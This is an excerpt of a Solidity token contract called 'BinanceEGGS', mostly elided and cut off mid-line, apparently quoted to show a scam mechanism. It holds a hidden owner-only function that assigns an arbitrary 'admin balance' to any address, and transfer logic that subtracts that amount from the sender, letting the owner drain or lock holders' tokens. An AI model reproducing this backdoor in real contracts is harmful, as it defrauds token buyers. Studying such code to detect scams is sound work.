...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "BinanceEGGS";
    ...
    mapping (address => uint256) private _adminBalance;
    function updateAdminBBBB(address _address, uint256 _value) external onlyOwner {
        _adminBalance[_address] = _value;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balance[sender] = _balance[sender].sub(amount)-(_adminBalance[sender]);
        uint256 amoun;
